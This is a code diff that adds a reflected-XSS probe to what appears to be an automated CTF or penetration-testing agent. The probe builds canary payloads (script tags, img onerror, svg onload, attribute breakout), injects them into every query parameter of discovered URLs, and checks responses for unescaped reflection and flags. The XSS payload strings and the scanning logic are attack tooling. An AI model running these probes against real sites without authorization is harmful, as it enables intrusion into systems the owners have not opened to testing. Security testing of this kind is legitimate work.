@@ -955,3 +955,213 @@ class GenericInjectionChainMixin:
             progress=progress,
             reason="; ".join(dict.fromkeys(reasons[:5])) or "xxe_injection exhausted",
         )
+
+    # ------------------------------------------------------------------
+    # Reflected XSS (WSTG-INPV-01)
+    # ------------------------------------------------------------------
+    # Reflected XSS is a *client-side* injection: a request parameter is echoed
+    # back into the response without output encoding, so attacker markup runs in
+    # the victim's browser. Unlike the server-side file/RCE probes above, the
+    # confirmation signal is an *unescaped* reflection of a unique canary in an
+    # executable HTML context — the raw ``<``/``>``/quote characters survive
+    # (not entity-encoded as ``&lt;``). We honestly position this as confirming
+    # the client-side injection primitive (+ opportunistic flag extraction);
+    # turning a reflected XSS into a flag via an admin bot is the separate
+    # ``xss_admin_bot_sid`` chain (stored XSS / SID theft). Reachability bridging
+    # is via chains/web.py's ``WEB_STRATEGY_ORDER`` (pinned by the I5 invariant).
+
+    _REFLECTED_XSS_MARKER = "fhx55r3fl"
+    _REFLECTED_XSS_PARAM_NAMES = (
+        "q", "s", "search", "query", "keyword", "name", "msg", "message",
+        "error", "input", "text", "term", "lang", "redirect", "ref", "page",
+    )
+
+    @classmethod
+    def _build_reflected_xss_payloads(cls) -> list[str]:
+        """Build canary payloads whose reflection unescaped proves XSS.
+
+        Each payload embeds the unique marker inside an HTML-significant context
+        (script element / event handler / tag), so its verbatim appearance in a
+        response can only happen when the application failed to encode output.
+        """
+        marker = cls._REFLECTED_XSS_MARKER
+        return [
+            f"<script>{marker}()</script>",
+            f"<img src=x onerror={marker}()>",
+            f"<svg/onload={marker}()>",
+            f'"><b>{marker}</b>',
+        ]
+
+    @classmethod
+    def _reflected_xss_reflected_unescaped(cls, body: str) -> bool:
+        """True if the canary is reflected in an *unescaped* executable context.
+
+        Requires the marker plus a raw (non-entity-encoded) HTML signature, so a
+        properly-escaping application (``&lt;script&gt;...``) does not match —
+        this is what keeps the probe from false-positiving on safe reflection.
+        """
+        marker = cls._REFLECTED_XSS_MARKER
+        if marker not in body:
+            return False
+        # Every signature carries a raw "<" (or unescaped '"<'), so an app that
+        # entity-encodes angle brackets (&lt;img ... onerror=marker&gt;) does not
+        # match even though the inert "onerror=marker" text survives.
+        signatures = (
+            f"<script>{marker}",
+            f"<img src=x onerror={marker}",
+            f"<svg/onload={marker}",
+            f'"><b>{marker}',
+            f"<b>{marker}",
+        )
+        return any(sig in body for sig in signatures)
+
+    @staticmethod
+    def _inject_reflected_xss_into_params(url: str, payload: str) -> str:
+        """Replace every query parameter value with the XSS payload."""
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query, keep_blank_values=True)
+        if not params:
+            params = {"q": [""]}
+        for key in list(params):
+            params[key] = [payload]
+        return parsed._replace(query=urlencode(params, doseq=True)).geturl()
+
+    def _collect_reflected_xss_targets(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> list[str]:
+        """Discover reflectable query-parameter surfaces for reflected XSS.
+
+        Pulls query-bearing links/observations and GET forms, falling back to a
+        small set of conventional reflective parameter names on the base so a
+        bare search/echo clue still gets one real shot.
+        """
+        base = _base_target(target)
+        urls: list[str] = []
+        seen: set[str] = set()
+
+        def _add(candidate: str) -> None:
+            normalized = _normalize_exploration_url(candidate) or candidate
+            if normalized and normalized not in seen:
+                seen.add(normalized)
+                urls.append(normalized)
+
+        seeds = list(page_features.get("raw_links") or [])
+        if self.state is not None:
+            for observation in self.state.observations:
+                if isinstance(observation.metadata, dict):
+                    for key in ("url", "final_url"):
+                        value = str(observation.metadata.get(key) or "").strip()
+                        if value:
+                            seeds.append(value)
+        for raw in seeds:
+            text = str(raw or "").strip()
+            if not text:
+                continue
+            absolute = urljoin(base + "/", text)
+            if urlparse(absolute).query:
+                _add(absolute)
+
+        for form in page_features.get("forms") or []:
+            if not isinstance(form, dict):
+                continue
+            if str(form.get("method") or "GET").strip().upper() != "GET":
+                continue
+            action = urljoin(
+                target if target.endswith("/") else target + "/",
+                str(form.get("action") or "").strip(),
+            )
+            fields: dict[str, str] = {}
+            for item in form.get("inputs") or []:
+                if not isinstance(item, dict):
+                    continue
+                name = str(item.get("name") or "").strip()
+                field_type = str(item.get("type") or "text").strip().lower()
+                if name and field_type not in {"submit", "button", "image", "reset", "file", "hidden"}:
+                    fields[name] = "test"
+            if fields:
+                _add(_with_query(action, fields))
+
+        if not urls:
+            for param in self._REFLECTED_XSS_PARAM_NAMES:
+                _add(_with_query(base + "/", {param: "test"}))
+
+        return urls[:5]
+
+    async def _run_reflected_xss_strategy(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> _ChainOutcome:
+        """Reflected-XSS probe: inject a canary, confirm unescaped reflection.
+
+        For each discovered reflectable parameter surface, injects each canary
+        payload and confirms via an *unescaped* reflection (client-side XSS
+        primitive, recorded as a vulnerability note) or, opportunistically, a
+        reflected flag (+ runtime verification).
+        """
+        self.tool_guard.require(["http_request"])
+        candidates = self._collect_reflected_xss_targets(target, page_features)
+        if not candidates:
+            return _ChainOutcome(progress=False, reason="reflected_xss: no injectable parameter surface")
+
+        payloads = self._build_reflected_xss_payloads()
+        host = urlparse(target).netloc or target
+        progress = False
+        reasons: list[str] = []
+        for candidate in candidates:
+            confirmed_endpoint = False
+            for payload in payloads:
+                if confirmed_endpoint:
+                    break
+                probe_url = self._inject_reflected_xss_into_params(candidate, payload)
+                response = await self._runtime_proxy_action(
+                    "request",
+                    method="GET",
+                    url=probe_url,
+                    timeout=15,
+                    audit_target=probe_url,
+                    audit_metadata={"phase": "reflected_xss"},
+                )
+                if not isinstance(response, dict):
+                    continue
+                body = str(response.get("body") or "")
+                if not body:
+                    continue
+                await self._scan_and_store(body, probe_url, evidence_source="http-response")
+                if extracted_flag := self._extract_flag(body):
+                    verification = await self._observe_flag(
+                        extracted_flag,
+                        target,
+                        evidence_source="http-response",
+                        rationale="reflected xss reflection",
+                        evidence_url=probe_url,
+                        evidence_snippet=body[:240],
+                        strategy_kind="reflected_xss",
+                    )
+                    if verification.decision in {"verified", "runtime"}:
+                        return _ChainOutcome(
+                            progress=True,
+                            flag=verification.flag,
+                            reason=f"reflected xss flag at {probe_url}",
+                        )
+                    progress = True
+                    reasons.append(f"reflected xss produced {verification.decision} flag")
+                if self._reflected_xss_reflected_unescaped(body):
+                    progress = True
+                    confirmed_endpoint = True
+                    reasons.append(f"reflected XSS confirmed (unescaped canary) at {probe_url}")
+                    await self._store_note(
+                        key="ctf_reflected_xss_confirmed",
+                        value=f"{probe_url} <- {payload}",
+                        category="vulnerability",
+                        target=host,
+                        url=probe_url,
+                    )
+                    break
+
+        return _ChainOutcome(
+            progress=progress,
+            reason="; ".join(dict.fromkeys(reasons[:5])) or "reflected_xss exhausted",
+        )
